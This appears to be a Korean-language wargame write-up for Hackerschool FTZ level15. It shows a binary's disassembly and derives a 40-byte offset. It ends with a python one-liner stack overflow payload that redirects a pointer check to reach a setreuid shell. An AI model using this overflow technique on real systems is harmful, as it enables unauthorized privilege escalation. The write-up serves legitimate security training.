Hackerschool FTZ level15
===
14번이랑 비슷한 문제지만 check가 pointer라는 차이가 있다 

~~~
0x08048490 <main+0>:    push   ebp

0x08048491 <main+1>:    mov    ebp,esp

0x08048493 <main+3>:    sub    esp,0x38

0x08048496 <main+6>:    sub    esp,0x4

0x08048499 <main+9>:    push   ds:0x8049664

0x0804849f <main+15>:   push   0x2d

0x080484a1 <main+17>:   lea    eax,[ebp-56]

0x080484a4 <main+20>:   push   eax

0x080484a5 <main+21>:   call   0x8048360 <fgets>

0x080484aa <main+26>:   add    esp,0x10

0x080484ad <main+29>:   mov    eax,DWORD PTR [ebp-16]

0x080484b0 <main+32>:   cmp    DWORD PTR [eax],0xdeadbeef

0x080484b6 <main+38>:   jne    0x80484dd <main+77>

0x080484b8 <main+40>:   sub    esp,0x8

0x080484bb <main+43>:   push   0xc18

0x080484c0 <main+48>:   push   0xc18

0x080484c5 <main+53>:   call   0x8048380 <setreuid>

0x080484ca <main+58>:   add    esp,0x10

0x080484cd <main+61>:   sub    esp,0xc

0x080484d0 <main+64>:   push   0x8048548

0x080484d5 <main+69>:   call   0x8048340 <system>

0x080484da <main+74>:   add    esp,0x10

0x080484dd <main+77>:   leave

0x080484de <main+78>:   ret

0x080484df <main+79>:   nop

출처: http://savefile.tistory.com/151 [해커 스토리]
~~~

여기서 0xdeadbeef의 주소를 check에 넣으면 
그pointer를 비교하므로 0xdeadbeef가 나오게 된다 그리고 buf와 check의 차이는 전과 같이 
>buf에서 *check까지의 거리 = 56-16 = 40

>(python -c 'print "\x90"*40+"\xb2\x84\x04\x08"';cat)|./attackme
